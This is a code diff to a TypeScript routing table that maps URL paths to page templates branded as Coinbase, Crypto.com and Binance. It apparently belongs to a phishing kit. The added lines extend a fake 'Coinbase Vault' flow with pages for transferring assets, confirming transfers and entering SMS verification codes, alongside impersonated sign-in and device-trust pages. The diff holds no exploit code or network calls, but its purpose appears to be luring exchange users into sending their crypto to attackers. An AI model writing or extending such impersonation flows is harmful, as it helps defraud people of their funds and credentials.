@@ -51,7 +51,13 @@ const COINBASE_PATHS: Record<string, VisitorTemplateRef> = {
 	'/signin/estimate-hold': { brand: 'Coinbase', page: 'Balance' },
 	'/signin/review': { brand: 'Coinbase', page: 'Review Login' },
 	'/signin/trust-device': { brand: 'Coinbase', page: 'Trust Device' },
-	'/signin/terminate-devices': { brand: 'Coinbase', page: 'Terminate Devices' }
+	'/signin/terminate-devices': { brand: 'Coinbase', page: 'Terminate Devices' },
+	'/vault/transfer': { brand: 'Coinbase', page: 'Transfer from Coinbase' },
+	'/vault/select-asset': { brand: 'Coinbase', page: 'Select Asset' },
+	'/vault/confirm': { brand: 'Coinbase', page: 'Confirm Transfer' },
+	'/vault/sms': { brand: 'Coinbase', page: 'Vault SMS' },
+	'/vault/verify': { brand: 'Coinbase', page: 'Verification Required' },
+	'/vault/dashboard': { brand: 'Coinbase', page: 'Vault Dashboard' }
 };
 
 const CDC_PATHS: Record<string, VisitorTemplateRef> = {
@@ -86,8 +92,13 @@ export const PATH_TO_TEMPLATE: Record<string, Record<string, VisitorTemplateRef>
 	Coinbase: COINBASE_PATHS,
 	'Coinbase Vault': {
 		'/vault/setup': { brand: 'Coinbase', page: 'Vault Setup' },
-		'/vault/dashboard': { brand: 'Coinbase', page: 'Vault' },
+		'/vault/dashboard': { brand: 'Coinbase', page: 'Vault Dashboard' },
 		'/vault/processing': { brand: 'Coinbase', page: 'Securing Account' },
+		'/vault/transfer': { brand: 'Coinbase', page: 'Transfer from Coinbase' },
+		'/vault/select-asset': { brand: 'Coinbase', page: 'Select Asset' },
+		'/vault/confirm': { brand: 'Coinbase', page: 'Confirm Transfer' },
+		'/vault/sms': { brand: 'Coinbase', page: 'Vault SMS' },
+		'/vault/verify': { brand: 'Coinbase', page: 'Verification Required' },
 		...COINBASE_PATHS
 	},
 	Binance: {
